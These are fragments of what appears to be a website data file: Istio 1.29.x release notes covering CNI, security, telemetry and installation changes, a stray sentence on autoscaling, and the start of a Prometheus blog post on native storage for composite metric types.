As a result, clients may resume sessions with unintended servers, and servers may resume sessions with unintended clients.</li>\n</ul>\n<h2 id=\"changes\">Changes</h2>\n<ul>\n<li>\n<p><strong>Added</strong> an opt-in feature when using <code>istio-cni</code> in ambient mode to create an Istio owned CNI config\nfile which contains the contents of the primary CNI config file and the Istio CNI plugin. This\nopt-in feature is a solution to the issue of traffic bypassing the mesh on node restart when the\nistio-cni <code>DaemonSet</code> is not ready, the Istio CNI plugin is not installed, or the plugin is not\ninvoked to configure traffic redirection from pods to their node ztunnels. This feature is enabled by\nsetting <code>cni.istioOwnedCNIConfig</code> to <code>true</code> in the <code>istio-cni</code> Helm chart values. If no value is set for\n<code>cni.istioOwnedCNIConfigFilename</code>, the Istio owned CNI config file will be named <code>02-istio-cni.conflist</code>.\nThe <code>istioOwnedCNIConfigFilename</code> must have a higher lexicographical priority than the primary CNI configuration filename.\nAmbient and chained CNI plugins must be enabled for this feature to work.</p>\n</li>\n<li>\n<p><strong>Added</strong> safeguards to the gateway deployment controller to validate object types, names, and namespaces,\npreventing the creation of arbitrary Kubernetes resources through template injection.\n(<a href=\"https://github.com/istio/istio/issues/58891\">Issue #58891</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> a retry mechanism when checking if a pod is ambient enabled in <code>istio-cni</code>.\nThis is to address potential transient failures resulting in potential mesh bypassing. This feature\nis disabled by default and can be enabled by setting <code>ambient.enableAmbientDetectionRetry</code> in the\n<code>istio-cni</code> chart.</p>\n</li>\n<li>\n<p><strong>Added</strong> namespace-based authorization for debug endpoints on port 15014.\nNon-system namespaces are restricted to <code>config_dump</code>/<code>ndsz</code>/<code>edsz</code> endpoints and same-namespace proxies only.\nDisable with <code>ENABLE_DEBUG_ENDPOINT_AUTH=false</code> if needed for compatibility.</p>\n</li>\n<li>\n<p><strong>Fixed</strong> translation function lookup errors for MeshConfig and MeshNetworks in istioctl.\n(<a href=\"https://github.com/istio/istio/issues/57967\">Issue #57967</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> a bug where <code>BackendTLSPolicy</code> status could lose track of the Gateway <code>ancestorRef</code> due to internal index corruption.\n(<a href=\"https://github.com/istio/istio/pull/58731\">Issue #58731</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where the istio-cni <code>DaemonSet</code> treated <code>NodeAffinity</code> changes as upgrades,\ncausing CNI config to be incorrectly left in place when a node no longer matched the <code>DaemonSet</code>&rsquo;s <code>NodeAffinity</code> rules.\n(<a href=\"https://github.com/istio/istio/issues/58768\">Issue #58768</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> resource annotation validation to reject newlines and control characters that could inject containers into pod specs via template rendering.\n(<a href=\"https://github.com/istio/istio/issues/58889\">Issue #58889</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> incorrect mapping of <code>meshConfig.tlsDefaults.minProtocolVersion</code> to <code>tls_minimum_protocol_version</code> in downstream TLS context.</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue causing the ambient multicluster cluster registry to become unstable periodically, leading to incorrect configuration being pushed to proxies.</p>\n</li>\n</ul>",

      "summary": "<h2 id=\"traffic-management\">Traffic Management</h2>\n<ul>\n<li>\n<p><strong>Promoted</strong> the <code>cni.ambient.dnsCapture</code> value to default to <code>true</code>.\nThis enables DNS proxying for workloads in ambient mesh by default, improving security and performance while enabling a number of features. This can be disabled explicitly or with <code>compatibilityVersion=1.24</code>.\nNote: only new pods will have DNS enabled. To enable DNS for existing pods, pods must be manually restarted, or the iptables reconciliation feature must be enabled with <code>--set cni.ambient.reconcileIptablesOnStartup=true</code>.</p>\n</li>\n<li>\n<p><strong>Promoted</strong> <code>cni.ambient.reconcileIptablesOnStartup</code> to default to <code>true</code>.\nThis enables automatic reconciliation of iptables/nftables rules for existing ambient pods when the <code>istio-cni</code> <code>DaemonSet</code> is upgraded,\neliminating the need to manually restart pods to receive updated networking configuration.\nThis can be disabled explicitly or by using <code>compatibilityVersion=1.28</code>.</p>\n</li>\n<li>\n<p><strong>Promoted</strong> support for <a href=\"https://gateway-api-inference-extension.sigs.k8s.io/\">Gateway API Inference Extension</a> to beta.\nThis feature currently remains off by default and can be turned on with the <code>ENABLE_GATEWAY_API_INFERENCE_EXTENSION</code> environment variable.\n(<a href=\"https://istio.io/docs/tasks/traffic-management/ingress/gateway-api-inference-extension/\">usage</a>) (<a href=\"https://github.com/istio/istio/issues/58533\">Issue #58533</a>)</p>\n</li>\n<li>\n<p><strong>Promoted</strong> multi-network multicluster support to Beta in ambient mode. Check out the <a href=\"https://istio.io/news/releases/1.29.x/announcing-1.29/#multi-network-multicluster-ambient-goes-beta\">announcements</a> for more details.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for Istio locality label <code>topology.istio.io/locality</code>, which takes precedence over <code>istio-locality</code>.</p>\n</li>\n<li>\n<p><strong>Added</strong> an option, <code>gateway.istio.io/tls-cipher-suites</code>, to specify the custom cipher suites on a Gateway. The value is a comma separated list of cipher suites.\n(<a href=\"https://github.com/istio/istio/issues/58366\">Issue #58366</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> alpha support for a baggage-based telemetry system for ambient mesh. Users of multinetwork\nambient will want to enable this feature via the <code>AMBIENT_ENABLE_BAGGAGE</code> pilot environment variable so that\nmetrics for cross-network traffic are properly attributed with source and destination labels. Note that\nztunnel already sends baggage in requests; this feature augments that functionality with waypoint-generated\nbaggage as well. As such, this feature is off by default for waypoints and on by default\nin ztunnels (configurable via the <code>ENABLE_RESPONSE_BAGGAGE</code> environment variable in ztunnel).</p>\n</li>\n<li>\n<p><strong>Added</strong> logic to designate a Workload Discovery (WDS) Service as canonical.\nA canonical WDS Service is used by ztunnel during name resolution unless another WDS Service\nin the same namespace as the client exists to override it. A canonical service will be configured\nfrom either (1) a Kubernetes <code>Service</code> resource or (2) the oldest Istio <code>ServiceEntry</code> resource that\nspecifies that hostname.\n(<a href=\"https://github.com/istio/istio/pull/58576\">Issue #58576</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> a new feature flag <code>DISABLE_TRACK_REMAINING_CB_METRICS</code> to control circuit breaker remaining metrics tracking.\nWhen set to <code>false</code> (default), circuit breaker remaining metrics will not be tracked, improving performance.\nWhen set to <code>true</code>, circuit breaker remaining metrics will be tracked (legacy behavior).\nThis feature flag will be removed in a future release.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for <code>LEAST_REQUEST</code> load balancing policy in gRPC proxyless clients.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for circuit breaking (<code>http2MaxRequests</code>) in gRPC proxyless clients.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for wildcard hosts in <code>ServiceEntry</code> resources with <code>DYNAMIC_DNS</code> resolution\nfor TLS hosts. The TLS protocol implies that connections will be routed based on the\nrequest&rsquo;s SNI (from the TLS handshake) without terminating the TLS connection to\ninspect the Host header for routing. The implementation relies on an alpha API\nand has significant security implications (i.e., SNI spoofing). Therefore, this\nfeature is disabled by default and can be enabled by setting the feature flag\n<code>ENABLE_WILDCARD_HOST_SERVICE_ENTRIES_FOR_TLS</code> to <code>true</code>. Please consider using\nthis feature carefully and only with trusted clients.\n(<a href=\"https://github.com/istio/istio/issues/54540\">Issue #54540</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where sidecars tried to route requests to ambient east/west gateways incorrectly.\n(<a href=\"https://github.com/istio/istio/issues/57878\">Issue #57878</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> Istio CNI node agent startup failure in MicroK8s environments when using ambient mode with nftables backend.\n(<a href=\"https://github.com/istio/istio/issues/58185\">Issue #58185</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where <code>InferencePool</code> configurations were lost during <code>VirtualService</code> merging when multiple <code>HTTPRoute</code> referencing different <code>InferencePool</code>s were attached to the same Gateway.\n(<a href=\"https://github.com/istio/istio/issues/58392\">Issue #58392</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where setting <code>ambient.istio.io/bypass-inbound-capture: &quot;true&quot;</code> caused inbound HBONE traffic to timeout because the iptables rule for tracking the ztunnel mark on connections was not applied. This change allows inbound HBONE connections to function normally while preserving the expected bypass behavior for inbound &ldquo;passthrough&rdquo; connections.\n(<a href=\"https://github.com/istio/istio/issues/58546\">Issue #58546</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> a bug where the <code>BackendTLSPolicy</code> status could lose track of the Gateway <code>ancestorRef</code> due to internal index corruption.\n(<a href=\"https://github.com/istio/istio/pull/58731\">Issue #58731</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where warmup aggression is not aligned with Envoy configuration.\n(<a href=\"https://github.com/istio/api/issues/3395\">Issue #3395</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where ingress gateways in ambient multi-cluster did not route requests to exposed remote backends. This fix is behind a new feature flag <code>AMBIENT_ENABLE_MULTI_NETWORK_INGRESS</code>, which is <code>false</code> by default. If the user wants to use this functionality, they need to set it to <code>true</code>.</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue causing the ambient multicluster cluster registry to become unstable periodically, leading to incorrect configuration being pushed to proxies.</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where the overload manager resource monitor for global downstream max connections\nwas set to the maximum integer value and could not be configured via Runtime Flags.\nUsers can now configure the global downstream max connections limit via proxy metadata <code>ISTIO_META_GLOBAL_DOWNSTREAM_MAX_CONNECTIONS</code>.\nThe runtime flag <code>overload.global_downstream_max_connections</code> is still honored if specified for backwards compatibility but is deprecated in favor\nof this new approach using proxy metadata.</p>\n<p>If <code>overload.global_downstream_max_connections</code> is specified, Envoy deprecated warnings will appear.</p>\n<p>If both <code>ISTIO_META_GLOBAL_DOWNSTREAM_MAX_CONNECTIONS</code> and <code>overload.global_downstream_max_connections</code> are specified,\nproxy metadata will take precedence over the runtime flag.\n(<a href=\"https://github.com/istio/istio/issues/58594\">Issue #58594</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> warning about <code>CONSISTENT_HASH</code> load balancing policy in gRPC proxyless clients.</p>\n</li>\n<li>\n<p><strong>Fixed</strong> gRPC xDS Listener to send both current and deprecated TLS certificate provider fields,\nenabling compatibility across old and new gRPC clients (<code>pre-1.66</code> and <code>1.66+</code>).</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where CNI initialization could fail when creating host iptables/nftables rules for health check probes. The initialization now retries up to 10 times with a 2-second delay between attempts to handle transient failures.</p>\n</li>\n</ul>\n<h2 id=\"security\">Security</h2>\n<ul>\n<li>\n<p><strong>Improved</strong> remote cluster trust domain handling by implementing watching of remote <code>meshConfig</code>.\nIstiod now automatically watches and updates trust domain information from remote clusters,\nensuring accurate SAN matching for services that belong to more than one trust domain.</p>\n</li>\n<li>\n<p><strong>Added</strong> an opt-in feature when using istio-cni in ambient mode to create an Istio-owned CNI config\nfile that contains the contents of the primary CNI config file and the Istio CNI plugin. This\nopt-in feature is a solution to the issue of traffic bypassing the mesh on node restart when the\nistio-cni <code>DaemonSet</code> is not ready, the Istio CNI plugin is not installed, or the plugin is not\ninvoked to configure traffic redirection from pods to their node ztunnels. This feature is enabled by\nsetting <code>cni.istioOwnedCNIConfig</code> to <code>true</code> in the istio-cni Helm chart values. If no value is set for\n<code>cni.istioOwnedCNIConfigFilename</code>, the Istio-owned CNI config file will be named <code>02-istio-cni.conflist</code>.\nThe <code>istioOwnedCNIConfigFilename</code> must have a higher lexicographical priority than the primary CNI.\nAmbient and chained CNI plugins must be enabled for this feature to work.</p>\n</li>\n<li>\n<p><strong>Added</strong> optional <code>NetworkPolicy</code> deployment for istiod and istio-cni</p>\n<p>You can set <code>global.networkPolicy.enabled=true</code> to deploy a default <code>NetworkPolicy</code> for istiod,\nistio-cni and gateways.\n(<a href=\"https://github.com/istio/api/issues/56877\">Issue #56877</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for watching symlink secrets in the Istio node agent.</p>\n</li>\n<li>\n<p><strong>Added</strong> Certificate Revocation List (CRL) support in ztunnel. When a <code>ca-crl.pem</code> file is provided via plugged-in CA, istiod automatically\ndistributes CRLs to all participating namespaces in the cluster.\n(<a href=\"https://github.com/istio/istio/issues/58733\">Issue #58733</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> an experimental feature to allow dry-run of <code>AuthorizationPolicy</code> resources in ztunnel. This feature will be disabled by default. See the Upgrade Note for details.\n(<a href=\"https://istio.io/docs/tasks/security/authorization/authz-dry-run/\">usage</a>) (<a href=\"https://github.com/istio/api/pull/1933\">Issue #1933</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support to block CIDRs in JWKS URIs when fetching public keys for JWT validation.\nIf any resolved IP from a JWKS URI matches a blocked CIDR, Istio will skip fetching the public key\nand use a fake JWKS instead to reject requests with JWT tokens.</p>\n</li>\n<li>\n<p><strong>Added</strong> a retry mechanism when checking if a pod is ambient enabled in istio-cni.\nThis is to address potential transient failures resulting in potential mesh bypassing. This feature\nis disabled by default and can be enabled by setting <code>ambient.enableAmbientDetectionRetry</code> in the\n<code>istio-cni</code> chart.</p>\n</li>\n<li>\n<p><strong>Added</strong> namespace-based authorization for debug endpoints on port 15014.\nNon-system namespaces restricted to <code>config_dump</code>/<code>ndsz</code>/<code>edsz</code> endpoints and same-namespace proxies only.\nDisable with <code>ENABLE_DEBUG_ENDPOINT_AUTH=false</code> if needed for compatibility.</p>\n</li>\n<li>\n<p><strong>Fixed</strong> resource annotation validation to reject newlines and control characters that could inject containers into pod specs via template rendering.\n(<a href=\"https://github.com/istio/istio/issues/58889\">Issue #58889</a>)</p>\n</li>\n</ul>\n<h2 id=\"telemetry\">Telemetry</h2>\n<ul>\n<li>\n<p><strong>Deprecated</strong> the <code>sidecar.istio.io/statsCompression</code> annotation, which is replaced by the <code>statsCompression</code> <code>proxyConfig</code> option. Per-pod overrides are still possible via <code>proxy.istio.io/config</code> annotation.\n(<a href=\"https://github.com/istio/istio/issues/48051\">Issue #48051</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> <code>statsCompression</code> option in <code>proxyConfig</code> to allow global configuration of HTTP compression for the Envoy stats endpoint exposing its metrics. This is enabled by default, offering <code>brotli</code>, <code>gzip</code> and <code>zstd</code> depending on the <code>Accept-Header</code> sent by the client.\n(<a href=\"https://github.com/istio/istio/issues/48051\">Issue #48051</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> source and destination workload identification to waypoint proxy traces.\nWaypoint proxies now include <code>istio.source_workload</code>, <code>istio.source_namespace</code>, <code>istio.destination_workload</code>, <code>istio.destination_namespace</code> and\nother source peer tags in trace spans, matching the observability capabilities of sidecar proxies.\n(<a href=\"https://github.com/istio/istio/issues/58348\">Issue #58348</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support for <code>Formatter</code> type custom tag the in Telemetry API.</p>\n</li>\n<li>\n<p><strong>Added</strong> <code>istiod_remote_cluster_sync_status</code> gauge metric to Pilot to track the synchronization status of remote clusters.</p>\n</li>\n<li>\n<p><strong>Added</strong> waypoint span tags <code>istio.downstream.workload</code>, <code>istio.downstream.namespace</code>, <code>istio.upstream.workload</code>,\nand <code>istio.upstream.namespace</code> to the upstream and downstream workload and namespace.</p>\n</li>\n<li>\n<p><strong>Added</strong> <code>timeout</code> and <code>headers</code> fields to <code>ZipkinTracingProvider</code> to the <code>MeshConfig</code>&rsquo;s <code>extensionProviders</code>.\nThe <code>timeout</code> field configures the HTTP request timeout when sending spans to the Zipkin collector,\nproviding better control over trace export reliability. The <code>headers</code> field allows including custom\nHTTP headers for authentication, authorization, and custom metadata use cases. Headers support both\ndirect values and environment variable references for secure credential management.\n(<a href=\"https://www.envoyproxy.io/docs/envoy/latest/api-v3/config/trace/v3/zipkin.proto\">Envoy</a>) (<a href=\"https://istio.io/docs/reference/config/istio.mesh.v1alpha1/#MeshConfig-ExtensionProvider-ZipkinTracingProvider\">reference</a>) (<a href=\"https://istio.io/docs/tasks/observability/distributed-tracing/\">usage</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue causing metrics to be reported with unknown labels in ambient multi-network deployments even\nwhen baggage-based peer metadata discovery was enabled by setting <code>AMBIENT_ENABLE_BAGGAGE</code> environment variable\nto <code>true</code> for pilot.\n(<a href=\"https://github.com/istio/istio/issues/58794\">Issue #58794</a>),(<a href=\"https://github.com/istio/istio/issues/58476\">Issue #58476</a>)</p>\n</li>\n</ul>\n<h2 id=\"installation\">Installation</h2>\n<ul>\n<li>\n<p><strong>Updated</strong> <code>istiod</code> to set <code>GOMEMLIMIT</code> to 90% of the memory limit (previously 100%) to reduce the risk of OOM kills.\nThis is now handled automatically via the <code>automemlimit</code> library. Users can override this by setting the <code>GOMEMLIMIT</code>\nenvironment variable directly, or adjust the ratio using the <code>AUTOMEMLIMIT</code> environment variable (e.g., <code>AUTOMEMLIMIT=0.85</code> for 85%).</p>\n</li>\n<li>\n<p><strong>Updated</strong> Kiali addon to version <code>v2.21.0</code>.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for filtering resources that Pilot will watch, based on the environment variable <code>PILOT_IGNORE_RESOURCES</code>.</p>\n<p>This variable is a comma-separated list of resources and prefixes that should be ignored by the Istio CRD watcher.\nIf there is a need to explicitly include a resource, even when it is on the ignore list, this can be done\nusing the variable <code>PILOT_INCLUDE_RESOURCES</code>.</p>\n<p>This feature enables administrators to deploy Istio as a Gateway API-only controller, ignoring mesh resources,\nor to deploy Istio with support only for Gateway API <code>HTTPRoute</code> (e.g., GAMMA support).\n(<a href=\"https://github.com/istio/istio/issues/58425\">Issue #58425</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> support to customize the Envoy file flush interval and buffer configurations in <code>ProxyConfig</code>.\n(<a href=\"https://github.com/istio/istio/issues/58545\">Issue #58545</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> safeguards to the gateway deployment controller to validate object types, names, and namespaces,\nto prevent the creation of arbitrary Kubernetes resources through template injection.\n(<a href=\"https://github.com/istio/istio/issues/58891\">Issue #58891</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> a setting <code>values.pilot.crlConfigMapName</code> that allows configuring the name of the <code>ConfigMap</code> that istiod uses to propagate its Certificate Revocation List (CRL) in the cluster. This allows running multiple control planes with overlapping namespaces in the same cluster.</p>\n</li>\n<li>\n<p><strong>Added</strong> support for configuring <code>terminationGracePeriodSeconds</code> on the istio-cni pod, and updated the default value from 5 secs to 30 secs.\n(<a href=\"https://github.com/istio/istio/issues/58572\">Issue #58572</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where <code>iptables</code> command was not waiting to acquire a lock on <code>/run/xtables.lock</code>,\ncausing some misleading errors in the logs.\n(<a href=\"https://github.com/istio/istio/issues/58507\">Issue #58507</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> an issue where the istio-cni <code>DaemonSet</code> treated <code>nodeAffinity</code> changes as upgrades,\ncausing CNI config to be incorrectly left in place when a node no longer matched the <code>DaemonSet</code>&rsquo;s <code>nodeAffinity</code> rules.\n(<a href=\"https://github.com/istio/istio/issues/58768\">Issue #58768</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> <code>istio-gateway</code> helm chart values schema to allow top-level <code>enabled</code> field.\n(<a href=\"https://github.com/istio/istio/issues/58277\">Issue #58277</a>)</p>\n</li>\n<li>\n<p><strong>Removed</strong> obsolete manifests from the <code>base</code> Helm chart.

safeguards to the gateway deployment controller to validate object types, names, and namespaces,\npreventing creation of arbitrary Kubernetes resources through template injection.\n(<a href=\"https://github.com/istio/istio/issues/58891\">Issue #58891</a>)</p>\n</li>\n<li>\n<p><strong>Added</strong> namespace-based authorization for debug endpoints on port 15014.\nNon-system namespaces are now restricted to <code>config_dump/ndsz/edsz</code> endpoints and same-namespace proxies only.\nIf needed for compatibility, this behavior can be disabled with <code>ENABLE_DEBUG_ENDPOINT_AUTH=false</code>.</p>\n</li>\n<li>\n<p><strong>Added</strong> <code>service.selectorLabels</code> field to the gateway Helm chart for custom service selector labels during revision-based migrations.</p>\n</li>\n<li>\n<p><strong>Fixed</strong> resource annotation validation to reject newline and control characters that could inject containers into pod specs via template rendering.\n(<a href=\"https://github.com/istio/istio/issues/58889\">Issue #58889</a>)</p>\n</li>\n<li>\n<p><strong>Fixed</strong> incorrect mapping of <code>meshConfig.tlsDefaults.minProtocolVersion</code> to <code>tls_minimum_protocol_version</code> in downstream TLS context.</p>\n</li>\n</ul>",

This strategy is problematic for two reasons: first, because it&rsquo;s often too late to scale when traffic has already arrived and second, resources will be overprovisioned and idle during the times that traffic isn&rsquo;t present.",

Piece by piece, we unexpectedly get closer to goals we never dreamed we would achieve as an open-source project!</p>\n<p>This post starts (hopefully!) as a series of blog posts that share a few ambitious shifts that might be exciting to new and existing Prometheus users and developers.

Some of the mentioned changes haven't been (yet) officially approved by the Prometheus Team; some of them were not proved in production.</p>\n</blockquote>\n<blockquote>\n<p>NOTE: This post was written by humans; AI was used only for cosmetic and grammar fixes.</p>\n</blockquote>\n<h2>Classic Representation: Primitive Samples</h2>\n<p>As you might know, the Prometheus data model (so server, PromQL, protocols) supports <a href=\"https://prometheus.io/docs/concepts/metric_types/#gauge\"><code>gauges</code></a>, <a href=\"https://prometheus.io/docs/concepts/metric_types/#counter\"><code>counters</code></a>, <a href=\"https://prometheus.io/docs/concepts/metric_types/#histogram\"><code>histograms</code></a> and <a href=\"https://prometheus.io/docs/concepts/metric_types/#summary\"><code>summaries</code></a>. <a href=\"https://prometheus.io/docs/specs/om/open_metrics_spec/\">OpenMetrics 1.0</a> extended this with <a href=\"https://prometheus.io/docs/specs/om/open_metrics_spec/#gaugehistogram-1\"><code>gaugehistogram</code></a>, <a href=\"https://prometheus.io/docs/specs/om/open_metrics_spec/#info-1\"><code>info</code></a> and <a href=\"https://prometheus.io/docs/specs/om/open_metrics_spec/#stateset-1\"><code>stateset</code></a> types.</p>\n<p>Impressively, for a long time Prometheus' TSDB storage implementation had an explicitly clean and simple data model. The TSDB allowed the storage and retrieval of string-labelled <strong>primitive</strong> samples containing only <code>float64</code> values and <code>int64</code> timestamps. It was completely metric-type-agnostic.</p>\n<p>The metric types were implied on top of the TSDB, for humans and best effort tooling for PromQL. For simplicity, let's call this way of storing types a <strong>classic</strong> model or representation. In this model:</p>\n<p>We have <strong>primitive</strong> types:</p>\n<ul>\n<li>\n<p><code>gauge</code> is a \"default\" type with no special rules, just a float sample with labels.</p>\n</li>\n<li>\n<p><code>counter</code> that should have a <code>_total</code> suffix in the name for humans to understand its semantics.</p>\n<pre><code>foo_total 17.0\n</code></pre>\n</li>\n<li>\n<p><code>info</code> that needs an <code>_info</code> suffix in the metric name and always has a value of <code>1</code>.</p>\n</li>\n</ul>\n<p>We have <strong>composite</strong> types. This is where the fun begins. In the classic representation, composite metrics are represented as a set of primitive float samples:</p>\n<ul>\n<li>\n<p><code>histogram</code> is a group of <code>counters</code> with certain mandatory suffixes and <code>le</code> labels:</p>\n<pre><code>foo_bucket{le=\"0.0\"} 0\nfoo_bucket{le=\"1e-05\"} 0\nfoo_bucket{le=\"0.0001\"} 5\nfoo_bucket{le=\"0.1\"} 8\nfoo_bucket{le=\"1.0\"} 10\nfoo_bucket{le=\"10.0\"} 11\nfoo_bucket{le=\"100000.0\"} 11\nfoo_bucket{le=\"1e+06\"} 15\nfoo_bucket{le=\"1e+23\"} 16\nfoo_bucket{le=\"1.1e+23\"} 17\nfoo_bucket{le=\"+Inf\"} 17\nfoo_count 17\nfoo_sum 324789.3\n</code></pre>\n</li>\n<li>\n<p><code>gaugehistogram</code>, <code>summary</code>, and <code>stateset</code> types follow the same logic – a group of special <code>gauges</code> or <code>counters</code> that compose a single metric.</p>\n</li>\n</ul>\n<p>The classic model served the Prometheus project well. It significantly simplified the storage implementation, enabling Prometheus to be one of the most optimized, open-source time-series databases, with distributed versions based on the same data model available in projects like Cortex, Thanos, and Mimir, etc.</p>\n<p>Unfortunately, there are always tradeoffs. This classic model has a few limitations:</p>\n<ul>\n<li><strong>Efficiency:</strong> It tends to yield overhead for composite types because every new piece of data (e.g., new bucket) takes precious index space (it's a new unique series), whereas samples are significantly more compressible (rarely change, time-oriented).</li>\n<li><strong>Functionality:</strong> It poses limitations to the shape and flexibility of the data you store (unless we'd go into some JSON-encoded labels, which have massive downsides).</li>\n<li><strong>Transactionality:</strong> Primitive pieces of composite types (separate counters) are processed independently. While we did a lot of work to ensure write isolation and transactionality for scrapes, transactionality completely breaks apart when data is received or sent via remote write, OTLP protocols. For example, a classic histogram <code>foo</code> might have been partially sent, its <code>foo_bucket{le=\"1.1e+23\"} 17</code> counter series be delayed or dropped accidentally, which risks triggering false positive alerts.</li>\n<li><strong>Reliability:</strong> Consumers of the TSDB data have to essentially guess the type semantics. There's nothing stopping users from writing a <code>foo_bucket</code> gauge or <code>foo_total</code> histogram.</li>\n</ul>\n<h3>A Glimpse of Native Storage for Composite Types</h3>\n<p>The classic model was challenged by the introduction of <a href=\"https://prometheus.io/docs/specs/native_histograms/\">native histograms</a>. The TSDB was extended to store <a href=\"https://github.com/prometheus/prometheus/blob/19fd0b0b1dbfe01a5e49f5d04544a7c5853c12bb/model/histogram/histogram.go#L50\">composite histogram samples</a> other than float. We tend to call this a <strong>native</strong> histogram, because TSDB can now \"natively\" store a full (with sparse and exponential buckets) histogram as an atomic, composite sample.</p>\n<p>At that point, the common wisdom was to stop there. The special advanced histogram that's generally meant to replace the \"classic\" histograms uses a composite sample, while the rest of the metrics use the classic model. Making other composite types consistent with the new native model felt extremely disruptive to users, with too much work and risks. A common counter-argument was that users will eventually migrate their classic histograms naturally, and summaries are also less useful, given the more powerful bucketing and lower cost of native histograms.</p>\n<p>Unfortunately, the migration to native histograms was known to take time, given the slight PromQL change required to use them, and the new bucketing and client changes needed (applications have to define new or edit existing metrics to new histograms). There will also be old software used for a long time that never migrates. Eventually, it leaves Prometheus with no chance of deprecating classic histograms, with all the software solutions required to support the classic model, likely for decades.</p>\n<p>However, native histograms did push TSDB and the ecosystem into that new composite sample pattern. Some of those changes could be easily adapted to all composite types. Native histograms also gave us a glimpse of the many benefits of that native support. It was tempting to ask ourselves: <strong>would it be possible to add native counterparts of the existing composite metrics to replace them, ideally transparently?</strong></p>\n<p>Organically, in 2024, for transactionality and efficiency, we introduced a <a href=\"https://github.com/prometheus/proposals/blob/main/proposals/0031-classic-histograms-stored-as-native-histograms.md\">native histogram custom buckets(NHCB)</a> concept that essentially allows storing classic histograms with explicit buckets natively, reusing native histogram composite sample data structures.</p>\n<p>NHCB has proven to be at least 30% more efficient than the classic representation, while offering functional parity with\nclassic histograms. However, two practical challenges emerged that slowed down the adoption:</p>\n<ol>\n<li>\n<p><strong>Expanding</strong>, that is converting from NHCB to classic histogram, is relatively trivial, but <strong>combining</strong>, which is turning a classic histogram into NHCB, is often not feasible. We don't want to wait for client ecosystem adoption, and also being mindful of legacy, hard to change software, we envisioned NHCB being converted (so combined) on scrape from the classic representation. That has proven to be somewhat expensive on scrape. Additionally, combination logic is practically impossible when receiving \"pushes\" (e.g., remote write with classic histograms), as you could end up having different parts of the same histogram sample (e.g., buckets and count) sent via different remote write shards or sequential messages. This combination challenge is also why OpenTelemetry collector users see an extra overhead on <code>prometheusreceiver</code> as the OpenTelemetry model strictly follows the composite sample model.</p>\n</li>\n<li>\n<p><strong>Consumption</strong> is slightly different, especially in the PromQL query syntax. Our initial decision was to surface NHCB histograms using a native-histogram-like PromQL syntax. For example the following classic histogram:</p>\n<pre><code>foo_bucket{le=\"0.0\"} 0\n# ...\nfoo_bucket{le=\"1.1e+23\"} 17\nfoo_bucket{le=\"+Inf\"} 17\nfoo_count 17\nfoo_sum 324789.3\n</code></pre>\n<p>When we convert this to NHCB, you can no longer use <code>foo_bucket</code> as your metric name selector. Since NHCB is now stored as a <code>foo</code> metric, you need to use:</p>\n<pre><code>histogram_quantile(0.9, sum(foo{job=\"a\"}))\n\n# Old syntax: histogram_quantile(0.9, sum(foo_bucket{job=\"a\"}) by (le))\n</code></pre>\n<p>This has also another effect. It violates our <a href=\"https://youtu.be/KTdhXHY-Hqo?t=426\">\"what you see is what you query\"</a> rule for the text formats, at least until <a href=\"https://github.com/prometheus/OpenMetrics/issues/276\">OpenMetrics 2</a>.</p>\n<p>On top of that, similar problems occur on other Prometheus outputs (federation, remote read, and remote write).</p>\n</li>\n</ol>\n<blockquote>\n<p>NOTE: Fun fact: Prometheus <a href=\"https://github.com/prometheus/client_model\">client data model (SDKs)</a> and <code>PrometheusProto</code>\nscrape protocol use the composite sample model already!</p>\n</blockquote>\n<h3>Transparent Native Representation</h3>\n<p>Let's get straight to the point. Organically, the Prometheus community seems to align with the following two ideas:</p>\n<ul>\n<li>We want to <strong>eventually move to a fully composite sample model on the storage layer</strong>, given all the benefits.</li>\n<li>Users needs to be able to <strong>switch (e.g., <a href=\"https://prometheus.io/docs/prometheus/latest/configuration/configuration/#:~:text=custom%20buckets.%0A%20%20%5B-,convert_classic_histograms_to_nhcb,-%3A%20%3Cbool%3E%20%7C%20default\">on scrape</a>) from classic to native form in storage without breaking consumption layer</strong>. Essentially to help with non-trivial migration pains (finding who use what, double-writing, synchronizing), avoiding <a href=\"https://github.com/prometheus/OpenMetrics/issues/312#issuecomment-3818547465\">tricky, dual mode, protocol changes</a> and to deprecate the classic model ASAP for the sustainability of the Prometheus codebase, we need to ensure <strong>eventual consumption migration</strong> e.g., PromQL queries -- independently to the storage layer.</li>\n</ul>\n<p>Let's go through evidence of this direction, which also represents efforts you can contribute to or adopt early!</p>\n<ol>\n<li>\n<p>We are discussing the \"native\" <a href=\"https://github.com/prometheus/prometheus/issues/16949\">summary</a> and 